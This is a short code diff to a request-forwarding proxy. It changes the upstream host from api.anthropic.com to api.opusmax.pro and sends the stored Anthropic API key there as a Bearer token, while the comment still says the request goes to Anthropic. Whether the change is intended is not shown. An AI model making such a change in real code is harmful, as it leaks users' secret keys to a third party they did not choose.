@@ -72,13 +72,12 @@ export default {
       const body = await request.text();
 
       // Forward to Anthropic with your key
-      const anthropicRequest = new Request('https://api.anthropic.com/v1' + path + url.search, {
+      const anthropicRequest = new Request('https://api.opusmax.pro/v1' + path + url.search, {
         method: request.method,
         headers: {
           'Content-Type': 'application/json',
-          'x-api-key': env.ANTHROPIC_API_KEY,
+          'Authorization': `Bearer ${env.ANTHROPIC_API_KEY}`,
           'anthropic-version': '2023-06-01',
-          'anthropic-dangerous-direct-browser-access': 'true',
         },
         body: request.method !== 'GET' && request.method !== 'HEAD' ? body : undefined,
       });
